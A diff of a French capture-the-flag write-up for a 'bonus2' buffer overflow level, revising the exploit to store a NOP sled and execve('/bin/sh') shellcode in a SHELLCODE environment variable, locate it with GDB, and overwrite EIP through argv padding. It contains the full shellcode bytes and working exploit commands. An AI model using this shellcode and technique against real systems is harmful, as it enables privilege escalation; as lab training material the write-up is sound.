@@ -128,46 +128,63 @@ EIP 1 byte plus tôt dans argv2 = 18
 
 ### 3. Vecteur d'injection : variable d'environnement
 
-**Pourquoi `LANG` ?**
+**Pourquoi pas dans LANG directement ?**
 
-La variable `LANG` est accessible via `getenv()`. Elle réside dans le **segment d'environnement** de la stack, à une adresse relativement stable et accessible depuis le processus.
-
-**Trick clé** : `strcmp(env_lang, "nl")` compare toute la chaîne. Mais en exportant `LANG="nl<NOP><shellcode>"`, `strcmp` voit `"nl\x90..."` ≠ `"nl"` → `lang` resterait 0 !
-
-**Solution** : `getenv("LANG")` retourne un pointeur vers la valeur brute. On utilise le fait que `strcmp("nl\x90...", "nl")` est différent de `"nl"` — donc on doit s'assurer que `LANG` commence **exactement** par `"nl"` ou `"fi"` sans rien après... Mais non :
-
-```c
-if (strcmp(env_lang, "fi") == 0) lang = 1;
-else if (strcmp(env_lang, "nl") == 0) lang = 2;
+Si on met le shellcode dans LANG :
+```bash
+export LANG=$(python -c 'print "nl" + "\x90"*100 + shellcode')
 ```
 
-`strcmp` compare jusqu'au `\0`. `"nl\x90..."` ne commence **pas** par `\0` après `nl`, donc `strcmp("nl\x90...", "nl") != 0`.
+Le programme fait :
+```c
+if (strcmp(env_lang, "nl") == 0) lang = 2;
+```
 
-**Solution réelle** : On met le shellcode dans `LANG` et on vise une adresse dans cette zone, indépendamment de la valeur de `lang`. Les deux LANG (`fi` et `nl`) fonctionnent — l'important c'est que `lang != 0` pour avoir un préfixe plus long.
+`strcmp("nl\x90...", "nl") != 0` → `lang` reste 0 → préfixe "Hello " (6 bytes) → **pas assez long pour atteindre EIP**.
+
+**Solution propre** : garder `LANG=nl` pur et mettre le shellcode dans une variable séparée :
 
 ```bash
-export LANG=$(python -c 'print("nl" + "\x90" * 100 + shellcode)')
-# LANG commence par "nl\x90..." → strcmp("nl\x90...", "nl") != 0
-# → lang reste 0... 
-# MAIS on peut aussi utiliser LANG="nl" (sans shellcode) et mettre le shellcode dans une autre variable
-# OU : mettre le shellcode dans LANG mais viser quand même cet espace mémoire
-# La solution retenue : LANG contient le shellcode ET on utilise nl/fi pour l'offset
+export LANG=nl         # strcmp("nl", "nl") = 0 → lang = 2 → bon préfixe ✅
+export SHELLCODE=$(python -c 'print "\x90"*100 + shellcode')  # shellcode en mémoire
 ```
 
-En pratique : la valeur de `LANG` en mémoire contient quand même les NOPs+shellcode, l'adresse est trouvable par GDB, et `lang=2` (nl) grâce aux 2 premiers chars. Le `strcmp` ne matche pas exactement `"nl"` mais les 2 premiers bytes font que le programme est en mode "nl".
-
-> **Note** : En réalité, `strcmp("nl\x90...", "nl") != 0`, donc `lang` reste 0 avec cette méthode. La solution robuste est d'exporter `LANG=nl` séparément et de mettre le shellcode dans une autre variable d'environnement (ex: `SHELLCODE`). L'adresse de cette variable est trouvée pareil avec GDB.
+Les variables d'environnement sont stockées en **haut de la stack** à des adresses stables — on peut y mettre un shellcode et trouver son adresse avec GDB.
 
 ### 4. Trouver l'adresse du shellcode avec GDB
 
+**Pourquoi main+130 ?**
+
+On désassemble main pour repérer l'appel à `getenv` :
 ```bash
-(gdb) b *main+125          # Breakpoint après getenv
-(gdb) run $(python -c 'print "A"*40') bla
-(gdb) x/20s *((char**)environ)    # Inspecter le segment d'environnement
-# Identifier l'adresse de LANG (ou de la variable contenant le shellcode)
-# Ajouter offset pour atterrir dans la zone NOP
-0xbffffeb4 + 50 ≈ 0xbffffee6
+(gdb) disass main
+# 0x080485a6 <+125>: call getenv
+# 0x080485ab <+130>: mov %eax,...  ← résultat stocké
 ```
+
+On met le breakpoint à `main+130` — juste **après** `getenv` — pour que les variables d'environnement soient en mémoire et inspectables.
+
+```bash
+(gdb) b *main+130
+(gdb) run $(python -c 'print "A"*40') bla
+(gdb) x/20s *((char**)environ)
+```
+
+On repère `SHELLCODE` dans la liste :
+```
+0xbffff88f : "SHELLCODE=\x90\x90...[shellcode]"
+```
+
+**Calcul de l'adresse cible** :
+```
+0xbffff88f       ← adresse de début de la variable
++ 10 bytes       ← taille de "SHELLCODE=" (le nom)
+= 0xbffff899     ← début du NOP sled
++ 50 bytes       ← milieu du NOP sled
+= 0xbffff8cb     ← adresse cible ✅
+```
+
+On choisit le milieu du NOP sled pour avoir une marge des deux côtés — robuste même si les adresses varient légèrement.
 
 ---
 
@@ -232,30 +249,30 @@ La zone NOP permet une tolérance sur l'adresse exacte — toute adresse tombant
 ### Étape 1 : Préparer l'environnement
 
 ```bash
-# Mettre shellcode dans LANG (ou autre variable)
-export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+export LANG=nl   # pur → strcmp("nl","nl") = 0 → lang = 2 → préfixe 13B
 ```
 
 ### Étape 2 : Trouver l'adresse avec GDB
 
 ```bash
-(gdb) b *main+125
+(gdb) b *main+130   ← juste après getenv
 (gdb) run $(python -c 'print "A"*40') bla
 (gdb) x/20s *((char**)environ)
-# Repérer LANG → adresse, ex: 0xbffffeb4
-# + 50 bytes (skip "nl" + début NOP) = 0xbffffee6
+# Repérer SHELLCODE → adresse, ex: 0xbffff88f
+# + 10 bytes (nom "SHELLCODE=") + 50 bytes (milieu NOP) = 0xbffff8cb
 ```
 
 ### Étape 3 : Lancer l'exploit
 
 **LANG=nl (offset=23)** :
 ```bash
-./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xcb\xf8\xff\xbf"')
 ```
 
 **LANG=fi (offset=18)** :
 ```bash
-./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xcb\xf8\xff\xbf"')
 ```
 
 ---
@@ -263,21 +280,22 @@ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x
 ## 🔄 Déroulement de l'exploitation
 
 ```
-1. export LANG = "nl" + NOP*100 + shellcode
-   → lang = 2 (si strcmp matche) ou lang = 0
+1. export SHELLCODE = NOP*100 + shellcode
+   export LANG = "nl"
+   → strcmp("nl", "nl") = 0 → lang = 2 ✅ → préfixe "Goedemiddag! " (13B)
 
 2. main() :
    combined[0..39]  ← "A"*40 (argv[1])
-   combined[40..62] ← "B"*23 + 0xbffffee6 (argv[2])
+   combined[40..62] ← "B"*23 + 0xbffff8cb (argv[2])
 
 3. greetuser(combined) :
    buffer ← "Goedemiddag! " (13B)
    strcat(buffer, combined) :
    buffer = "Goedemiddag! " + "A"*40 + "B"*23 + addr
    Total = 80 bytes dans buffer[64]
-   → Déborde de 16 bytes → EIP = 0xbffffee6 ✅
+   → Déborde de 16 bytes → EIP = 0xbffff8cb ✅
 
-4. ret → 0xbffffee6 → NOP sled → shellcode execve("/bin/sh") ✅
+4. ret → 0xbffff8cb → NOP sled dans SHELLCODE → shellcode execve("/bin/sh") ✅
    → Shell bonus3 🎉
 ```
 
